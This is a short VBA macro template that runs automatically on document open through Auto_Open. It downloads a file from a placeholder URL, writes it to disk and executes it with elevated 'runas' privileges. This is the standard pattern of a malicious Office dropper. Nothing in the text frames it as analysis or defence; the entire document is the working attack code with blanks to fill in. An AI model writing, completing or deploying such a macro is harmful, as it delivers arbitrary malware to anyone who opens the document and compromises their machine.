Sub Auto_Open()

	Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")

  Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
	xHttp.Open "Get", "<URL>", False
	xHttp.Send
	
	With bStrm
		.Type = 1 '//binary
		.Open
		.write xHttp.responseBody
		.savetofile "<DOWNLOADED FILE NAME>",2 '//overwrite
	End With
	
	Set objShell = CreateObject("Shell.Application")
	objShell.ShellExecute "<DOWNLOADED FILE NAME>", "", "", "runas", 1
	
End Sub
